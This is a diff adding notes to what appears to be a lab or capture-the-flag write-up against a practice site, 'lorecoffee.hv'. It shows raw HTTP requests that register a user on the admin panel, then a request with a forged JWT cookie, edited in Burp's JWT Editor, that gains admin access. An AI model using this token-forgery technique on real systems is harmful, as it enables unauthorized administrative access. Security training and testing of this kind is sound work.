@@ -62,3 +62,47 @@ assets/
 #+begin_src sh
 http://lorecoffee.hv/adminpanel/login
 #+end_src
+
+*registration endpoint in admin panel*
+#+begin_src sh
+http://lorecoffee.hv/adminpanel/register
+#+end_src
+
+it is possible to create an account and access the application, but when accessing we receive a message that we are not an administrator.
+
+Request to register ->
+#+begin_src sh
+POST /adminpanel/register HTTP/1.1
+Host: lorecoffee.hv
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+
+username=jon&email=jon@email.com&password=admin123
+#+end_src
+
+After registering the user, log in to the application and we receive the message that we are not an admin
+
+It is possible to verify that the application uses Json Web Tokens, get it and use the burp JWT Editor extension
+
+Send the request with the modified JWT
+#+begin_src sh
+GET /adminpanel HTTP/1.1
+Host: lorecoffee.hv
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://lorecoffee.hv/adminpanel/login
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA3MDgxOTAsImlkIjoxfQ.OM0hoV57yrGI_9oRBCPJp-qoPf4J8x7tW0FpM9FCl9o
+Connection: keep-alive
+#+end_src
+
+And now we are in the application.
